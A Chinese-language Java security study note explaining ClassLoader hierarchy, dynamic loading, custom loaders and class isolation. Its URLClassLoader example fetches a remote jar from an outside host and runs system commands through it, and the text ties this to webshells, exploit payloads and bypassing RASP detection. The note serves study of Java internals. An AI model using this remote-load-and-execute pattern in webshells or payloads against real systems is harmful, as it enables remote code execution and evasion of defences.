# JavaSec Note One

![image.png](https://img.ma5hr00m.top/blog/20240320164047.png)

## Java Class

[Java 对象和类 | 菜鸟教程](https://www.runoob.com/java/java-object-classes.html)

```bash
# 编译
javac TestHelloWorld.java

# 反编译（JDK自带指令）
javap -c -p -l TestHelloWorld.java
```

## ClassLoader

一切的 Java 类都必须经过 JVM 加载后才能运行，而 `ClassLoader` 的主要作用就是 Java 类文件的加载。JVM ClassLoader 自顶而下的结构：

1. **Bootstrap ClassLoader（引导类加载器）**：
    - 是 Java 类加载器层次结构中的最顶层。
    - 负责加载 Java 核心类库，例如 `java.lang.Object` 和 `java.lang.String` 等。
    - 通常由 JVM 实现提供，无法直接在 Java 代码中访问。
    - 不会加载应用程序自定义的类。
2. **Extension ClassLoader（扩展类加载器）**：
    - 是 Bootstrap ClassLoader 的子类。
    - 负责加载 Java 扩展类库，例如 JDK 中的 JDBC 驱动程序和其他扩展功能。
    - 也被称为 JRE 扩展类加载器。
    - 通常从 JRE 的 `lib/ext` 目录加载类。
3. **App ClassLoader（系统类加载器）**：
    - 是 Extension ClassLoader 的子类。
    - 负责加载应用程序的类，包括用户自定义的类和应用程序依赖的类。
    - 通常从应用程序的类路径（CLASSPATH）加载类。
    - 是大多数Java应用程序默认使用的类加载器。

未指定类加载器时默认使用 `App ClassLoader`，使用 `ClassLoader.getSystemClassLoader()` 返回的系统类加载器也是 `AppClassLoader`。

我们获取某个类加载器时可能会返回一个 `null` 值，如 `java.io.File` 类在 JVM 初始化的时候会被 `Bootstrap ClassLoader` 加载（该类加载器实现于 JVM 层，采用 C++编写），我们在尝试获取被 `Bootstrap ClassLoader` 类加载器所加载的类的 `ClassLoader` 时候都会返回 `null`。

`ClassLoader` 类有如下核心方法：

1. `loadClass`（加载指定的Java类）
2. `findClass`（查找指定的Java类）
3. `findLoadedClass`（查找JVM已经加载过的类）
4. `defineClass`（定义一个Java类）
5. `resolveClass`（链接指定的Java类）

## 类动态加载机制

  Java 类加载机制分为**显式** 和 **隐式**，`显式` 即我们通常使用 `Java反射` 或者 `ClassLoader` 来动态加载一个类对象（所以 Java 显式类加载也被成为类动态加载），而 `隐式` 指的是 `类名.方法名()` 或 `new` 类实例。

我们可以自定义类加载器去加载任意的类（类动态加载）。常用类动态加载机制如下：

```java
// 反射加载TestHelloWorld示例
Class.forName("com.anbai.sec.classloader.TestHelloWorld");

// ClassLoader加载TestHelloWorld示例
this.getClass().getClassLoader().loadClass("com.anbai.sec.classloader.TestHelloWorld");
```

## ClassLoader 类加载流程

以下面的代码为例（来自 [javasec](https://javasec.org)）

```java
package com.anbai.sec.classloader;

public class TestHelloWorld {

    public String hello() {
        return "Hello World~";
    }

}
```

1. `ClassLoader` 会调用 `public Class<?> loadClass(String name)` 方法加载 `com.anbai.sec.classloader.TestHelloWorld` 类，该方法用于加载具有指定二进制名称的类。
2. 调用 `findLoadedClass` 方法检查 `TestHelloWorld` 类是否已经初始化，如果 JVM 已初始化过该类则直接返回类对象。
3. 如果创建当前 `ClassLoader` 时传入了父类加载器（`new ClassLoader(父类加载器)`）就使用父类加载器加载 `TestHelloWorld` 类，否则使用 JVM 的 `Bootstrap ClassLoader` 加载。
4. 如果上一步无法加载 `TestHelloWorld` 类，那么调用自身的 `findClass` 方法尝试加载 `TestHelloWorld` 类。
5. 如果当前的 `ClassLoader` 没有重写了 `findClass` 方法，那么直接返回类加载失败异常。如果当前类重写了 `findClass` 方法并通过传入的 `com.anbai.sec.classloader.TestHelloWorld` 类名找到了对应的类字节码，那么应该调用 `defineClass` 方法去 JVM 中注册该类。
6. 如果调用 LoadClass 的时候传入的 `resolve` 参数为 true，那么还需要调用 `resolveClass` 方法链接类，默认为 false。
7. 返回一个被 JVM 加载后的 `java.lang.Class` 类对象。

> 如果的创建 `ClassLoader` 时没有传入父类加载器，并且引导类加载器也无法加载 `TestHelloWorld` 类，那么 `ClassLoader` 会尝试自己加载。
> 
> 引导类加载器（Bootstrap ClassLoader）通常只加载 Java 核心类库，而不会加载应用程序自定义的类。因此，如果 `TestHelloWorld` 类不是 Java 核心类库的一部分，引导类加载器就无法加载它

## 自定义 ClassLoader  

`java.lang.ClassLoader` 是所有的类加载器的父类，它有非常多的子类加载器，比如我们用于加载 jar 包的 `java.net.URLClassLoader` 其本身通过继承 `java.lang.ClassLoader` 类，重写了 `findClass` 方法从而实现了加载目录 class 文件甚至是远程资源文件。

仍然以上面的 `com.anbai.sec.classloader.TestHelloWorld` 为例，我们可以使用如下代码调用 `hello` 方法并输出：

```java
TestHelloWorld t = new TestHelloWorld();
String str = t.hello();
System.out.println(str);
```

但是如果 `com.anbai.sec.classloader.TestHelloWorld` 根本就不存在于我们的 `classpath`，那么我们可以使用自定义类加载器重写 `findClass` 方法，然后在调用 `defineClass` 方法的时候传入 `TestHelloWorld` 类的字节码的方式来向 JVM 中定义一个 `TestHelloWorld` 类，最后通过反射机制就可以调用 `TestHelloWorld` 类的 `hello` 方法了。

> `classpath` 是 Java 环境配置中要设置的一个环境变量，它表示 JVM 在哪里寻找要运行的 `.class` 文件。

这里我们编写一个专门处理 `TestHelloWorld` 类的 `TestClassLoader` 方法。

```java
package com.anbai.sec.classloader;

import java.lang.reflect.Method;

public class TestClassLoader extends ClassLoader {

    // TestHelloWorld类名
    private static String testClassName = "com.anbai.sec.classloader.TestHelloWorld";

    // TestHelloWorld类字节码
    private static byte[] testClassBytes = new byte[]{
            -54, -2, -70, -66, 0, 0, 0, 51, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0,
            16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100,
            101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101,
            1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108,
            97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99,
            101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111,
            114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 12, 72, 101, 108, 108, 111,
            32, 87, 111, 114, 108, 100, 126, 1, 0, 40, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47,
            115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115,
            116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108,
            97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1,
            0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0,
            1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1,
            0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11,
            0, 0, 0, 2, 0, 12
    };

    @Override
    public Class<?> findClass(String name) throws ClassNotFoundException {
        // 只处理TestHelloWorld类
        if (name.equals(testClassName)) {
            // 调用JVM的native方法定义TestHelloWorld类
            return defineClass(testClassName, testClassBytes, 0, testClassBytes.length);
        }

        return super.findClass(name);
    }

    public static void main(String[] args) {
        // 创建自定义的类加载器
        TestClassLoader loader = new TestClassLoader();

        try {
            // 使用自定义的类加载器加载TestHelloWorld类
            Class testClass = loader.loadClass(testClassName);

            // 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld();
            Object testInstance = testClass.newInstance();

            // 反射获取hello方法
            Method method = testInstance.getClass().getMethod("hello");

            // 反射调用hello方法,等价于 String str = t.hello();
            String str = (String) method.invoke(testInstance);

            System.out.println(str);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
```

在 Web 安全领域中，利用自定义类加载器我们可以在 webshell 中实现加载并调用自己编译的类对象，比如本地命令执行漏洞调用自定义类字节码的 native 方法绕过 RASP 检测，也可以用于加密重要的 Java 类字节码（只能算弱加密了）。

## URLClassLoader

`URLClassLoader` 继承了 `ClassLoader`，它提供了加载远程资源的能力，在写漏洞利用的 `payload` 或者 `webshell` 的时候我们可以使用这个特性来加载远程的 jar 来实现远程的类方法调用。

以下面的 TestURLClassLoader 为例：

```java
package com.anbai.sec.classloader;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLClassLoader;

public class TestURLClassLoader {

    public static void main(String[] args) {
        try {
            // 定义远程加载的jar路径
            URL url = new URL("https://anbai.io/tools/cmd.jar");

            // 创建URLClassLoader对象，并加载远程jar包
            URLClassLoader ucl = new URLClassLoader(new URL[]{url});

            // 定义需要执行的系统命令
            String cmd = "ls";

            // 通过URLClassLoader加载远程jar包中的CMD类
            Class cmdClass = ucl.loadClass("CMD");

            // 调用CMD类中的exec方法，等价于: Process process = CMD.exec("whoami");
            Process process = (Process) cmdClass.getMethod("exec", String.class).invoke(null, cmd);

            // 获取命令执行结果的输入流
            InputStream           in   = process.getInputStream();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[]                b    = new byte[1024];
            int                   a    = -1;

            // 读取命令执行结果
            while ((a = in.read(b)) != -1) {
                baos.write(b, 0, a);
            }

            // 输出命令执行结果
            System.out.println(baos.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
```

远程的 cmd. jar 中只有一个 `.class` 文件，对应的编译前的文件如下：

```java
import java.io.IOException;

public class CMD {
    public static Process exec(String cmd) throws IOException {
        return Runtime.getRuntime().exec(cmd);
    }

}
```

## ClassLoader 隔离

ClassLoader 是有隔离机制的，不同的 ClassLoader 可以加载相同的 Class（两者必须是非继承关系），同级 ClassLoader 跨类加载器调用方法时必须使用反射。

![image.png](https://img.ma5hr00m.top/blog/20240320200204.png)

[Java 类隔离加载的正确姿势 - 知乎](https://zhuanlan.zhihu.com/p/141527120)

:::danger

Working in progress...

:::